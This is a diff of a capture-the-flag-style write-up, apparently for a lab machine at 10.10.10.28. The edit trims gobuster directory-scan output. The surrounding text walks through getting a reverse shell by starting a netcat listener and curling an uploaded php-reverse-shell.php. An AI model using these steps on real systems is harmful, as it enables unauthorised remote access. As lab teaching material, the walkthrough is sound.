@@ -83,21 +83,11 @@ But wait.. we don’t know where the file will be uploaded to on the website. So
 
 ```bash
 $ gobuster dir -u http://10.10.10.28 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
-===============================================================
-Gobuster v3.1.0
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://10.10.10.28
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.1.0
-[+] Timeout:                 10s
-
+...
 /images               (Status: 301) [Size: 311] [--> http://10.10.10.28/images/]
 /themes               (Status: 301) [Size: 311] [--> http://10.10.10.28/themes/]
 /uploads              (Status: 301) [Size: 312] [--> http://10.10.10.28/uploads/
+...
 ```
 Now that we know the file will be uploaded to `uploads`, we can run a listener ```nc -nlvp 1234``` and curl the php file that we uploaded ```curl http://10.10.10.28/uploads/php-reverse-shell.php```
 Navigate to `http://10.10.10.28/uploads/php-reverse-shell.php` and our listener will be able to get a shell
